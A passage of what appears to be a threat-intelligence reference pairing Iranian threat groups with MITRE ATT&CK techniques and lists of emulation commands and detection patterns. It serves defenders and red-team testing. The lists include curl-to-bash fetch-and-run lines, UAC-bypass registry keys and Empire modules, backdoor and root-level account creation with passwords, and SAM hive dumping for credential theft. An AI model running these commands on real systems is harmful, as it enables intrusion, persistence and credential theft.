\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe|\Software\Classes\exefile\shell\runas\command\isolatedCommand
\Software\Classes\ms-settings\shell\open\command
\Software\Classes\ms-settings\shell\open\command
\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe
\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe
powershell/privesc/ask
powershell/privesc/ask
powershell/privesc/bypassuac
powershell/privesc/bypassuac
powershell/privesc/bypassuac_eventvwr
powershell/privesc/bypassuac_eventvwr
powershell/privesc/bypassuac_wscript
powershell/privesc/bypassuac_wscript
powershell/privesc/bypassuac_env
powershell/privesc/bypassuac_env
powershell/privesc/bypassuac_fodhelper
powershell/privesc/bypassuac_fodhelper
powershell/privesc/bypassuac_sdctlbypass
powershell/privesc/bypassuac_sdctlbypass
powershell/privesc/bypassuac_tokenmanipulation
powershell/privesc/bypassuac_tokenmanipulation
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: CMSTP

## Technique Description

```
The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.

CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)
```

## Technique Commands

```
cmstp.exe /s PathToAtomicsFolder\T1191\src\T1191.inf
cmstp.exe /s PathToAtomicsFolder\T1191\src\T1191_uacbypass.inf /au
winword.exe
cmstp.exe
/s|/ns|/aucmstp.exe
```



# Actor: CopyKittens

## Actor Description

```
[CopyKittens](https://attack.mitre.org/groups/G0052) is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip. (Citation: ClearSky CopyKittens March 2017) (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)
```

## Actor Aliases

```
CopyKittens
```

## Technique Name: Code Signing

## Technique Description

```
Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)

Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)

Code signing certificates may be used to bypass security policies that require signed code to execute on a system.
```

## Technique Commands

```
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Command-Line Interface

## Technique Description

```
Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).

Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.
```

## Technique Commands

```
bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
\\Windows\\.+\\cmd.exe
cmd.exe|/c
powershell/lateral_movement/invoke_sqloscmd
powershell/lateral_movement/invoke_sqloscmd
powershell/management/spawnas
powershell/management/spawnas
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Command-Line Interface

## Technique Description

```
Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).

Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.
```

## Technique Commands

```
bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
\\Windows\\.+\\cmd.exe
cmd.exe|/c
powershell/lateral_movement/invoke_sqloscmd
powershell/lateral_movement/invoke_sqloscmd
powershell/management/spawnas
powershell/management/spawnas
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Command-Line Interface

## Technique Description

```
Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).

Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.
```

## Technique Commands

```
bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
\\Windows\\.+\\cmd.exe
cmd.exe|/c
powershell/lateral_movement/invoke_sqloscmd
powershell/lateral_movement/invoke_sqloscmd
powershell/management/spawnas
powershell/management/spawnas
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Commonly Used Port

## Technique Description

```
Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as

* TCP:80 (HTTP)
* TCP:443 (HTTPS)
* TCP:25 (SMTP)
* TCP/UDP:53 (DNS)

They may use the protocol associated with the port or a completely different protocol. 

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are 

* TCP/UDP:135 (RPC)
* TCP/UDP:22 (SSH)
* TCP/UDP:3389 (RDP)
```

## Technique Commands

```
!=powershell.exe
nslookup
!=cmd.exe
nslookup
powershell/lateral_movement/invoke_sshcommand
powershell/lateral_movement/invoke_sshcommand
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Commonly Used Port

## Technique Description

```
Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as

* TCP:80 (HTTP)
* TCP:443 (HTTPS)
* TCP:25 (SMTP)
* TCP/UDP:53 (DNS)

They may use the protocol associated with the port or a completely different protocol. 

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are 

* TCP/UDP:135 (RPC)
* TCP/UDP:22 (SSH)
* TCP/UDP:3389 (RDP)
```

## Technique Commands

```
!=powershell.exe
nslookup
!=cmd.exe
nslookup
powershell/lateral_movement/invoke_sshcommand
powershell/lateral_movement/invoke_sshcommand
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Commonly Used Port

## Technique Description

```
Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as

* TCP:80 (HTTP)
* TCP:443 (HTTPS)
* TCP:25 (SMTP)
* TCP/UDP:53 (DNS)

They may use the protocol associated with the port or a completely different protocol. 

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are 

* TCP/UDP:135 (RPC)
* TCP/UDP:22 (SSH)
* TCP/UDP:3389 (RDP)
```

## Technique Commands

```
!=powershell.exe
nslookup
!=cmd.exe
nslookup
powershell/lateral_movement/invoke_sshcommand
powershell/lateral_movement/invoke_sshcommand
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Compile After Delivery

## Technique Description

```
Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)

```

## Technique Commands

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\T1500.exe #{input_file}
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\T1500.exe $PathToAtomicsFolder\T1500\src\calc.cs
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Compiled HTML File

## Technique Description

```
Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)

Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)
```

## Technique Commands

```
hh.exe PathToAtomicsFolder\T1223\src\T1223.chm
hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
\windows\hh.exe.chm
hh.exe|.chm
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Component Object Model and Distributed COM

## Technique Description

```
Adversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. 

COM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)

Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.

Adversaries may abuse COM for local command and/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific COM objects also exists to directly perform functions beyond code execution, such as creating a [Scheduled Task](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors such as Privilege Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)

Adversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.
```

## Technique Commands

```
powershell/lateral_movement/invoke_dcom
powershell/lateral_movement/invoke_dcom
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Connection Proxy

## Technique Description

```
Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.

External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the internet and then the proxy would forward communications to the C2 server.

Internal connection proxies can be used to consolidate internal connections from compromised systems. Adversaries may use a compromised internal system as a proxy in order to conceal the true destination of C2 traffic. The proxy can redirect traffic from compromised systems inside the network to an external C2 server making discovery of malicious traffic difficult. Additionally, the network can be used to relay information from one system to another in order to avoid broadcasting traffic to all systems.
```

## Technique Commands

```
export #{proxy_scheme}_proxy=127.0.0.1:8080
export http_proxy=127.0.0.1:8080
netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=127.0.0.1
python/management/multi/socks
python/management/multi/socks
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Connection Proxy

## Technique Description

```
Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.

External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the internet and then the proxy would forward communications to the C2 server.

Internal connection proxies can be used to consolidate internal connections from compromised systems. Adversaries may use a compromised internal system as a proxy in order to conceal the true destination of C2 traffic. The proxy can redirect traffic from compromised systems inside the network to an external C2 server making discovery of malicious traffic difficult. Additionally, the network can be used to relay information from one system to another in order to avoid broadcasting traffic to all systems.
```

## Technique Commands

```
export #{proxy_scheme}_proxy=127.0.0.1:8080
export http_proxy=127.0.0.1:8080
netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=127.0.0.1
python/management/multi/socks
python/management/multi/socks
```



# Actor: Leafminer

## Actor Description

```
[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)
```

## Actor Aliases

```
Leafminer
Raspite
```

## Technique Name: Create Account

## Technique Description

```
Adversaries with a sufficient level of access may create a local system, domain, or cloud tenant account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.

In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.

### Windows

The <code>net user</code> commands can be used to create a local or domain account.

### Office 365

An adversary with access to a Global Admin account can create another account and assign it the Global Admin role for persistent access to the Office 365 tenant.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)
```

## Technique Commands

```
Add backdoor user account:
net user support_388945a0 somepasswordhere /add /y
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add
Add backdoor user account:
shell net user support_388945a0 somepasswordhere /add /y
shell net localgroup administrators support_388945a0 /add
shell net localgroup "remote desktop users" support_388945a0 /add
post/windows/manage/add_user_domain
Enable backdoor user account:
net user support_388945a0 /active:yes
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add
Enable backdoor user account:
shell net user support_388945a0 /active:yes
shell net localgroup administrators support_388945a0 /add
shell net localgroup "remote desktop users" support_388945a0 /add
useradd -M -N -r -s /bin/bash -c evil_account evil_user
useradd -M -N -r -s /bin/bash -c evil_account evil_user
dscl . -create /Users/evil_user
dscl . -create /Users/evil_user UserShell /bin/bash
dscl . -create /Users/evil_user RealName "#{realname}"
dscl . -create /Users/evil_user UniqueID "1010"
dscl . -create /Users/evil_user PrimaryGroupID 80
dscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user
dscl . -create /Users/evil_user
dscl . -create /Users/evil_user UserShell /bin/bash
dscl . -create /Users/evil_user RealName "Evil Account"
dscl . -create /Users/evil_user UniqueID "1010"
dscl . -create /Users/evil_user PrimaryGroupID 80
dscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user
net user /add "T1136_CMD"
New-LocalUser -Name "T1136_PowerShell" -NoPassword
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter
echo "#{password}" | passwd --stdin butter
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter
echo "BetterWithButter" | passwd --stdin butter
Net.exe user /add
Net.exe localgroup administrators * /add
Net.exe user * \password \domain
Net.exe dsadd user
powershell/persistence/misc/add_netuser
powershell/persistence/misc/add_netuser
powershell/privesc/powerup/service_useradd
powershell/privesc/powerup/service_useradd
```



# Actor: Leafminer

## Actor Description

```
[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)
```

## Actor Aliases

```
Leafminer
Raspite
```

## Technique Name: Credential Dumping

## Technique Description

```
Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.

Several of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.

### Windows

#### SAM (Security Accounts Manager)

The SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)

Notes:
Rid 500 account is the local, in-built administrator.
Rid 501 is the guest account.
User accounts start with a RID of 1,000+.

#### Cached Credentials

The DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
Cached credentials for Windows Vista are derived using PBKDF2.

#### Local Security Authority (LSA) Secrets

With SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.
 
When services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
The passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.
Windows 10 adds protections for LSA Secrets described in Mitigation.

#### NTDS from Domain Controller

Active Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\NTDS\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)
 
The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy

#### Group Policy Preference (GPP) Files

Group Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.

These group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: "post/windows/gather/credentials/gpp"
* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

Notes:
On the SYSVOL share, the following can be used to enumerate potential XML files.
dir /s * .xml

#### Service Principal Names (SPNs)

See [Kerberoasting](https://attack.mitre.org/techniques/T1208).

#### Plaintext Credentials

After a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.

SSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.

The following SSPs can be used to access credentials:

Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)
Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)
 
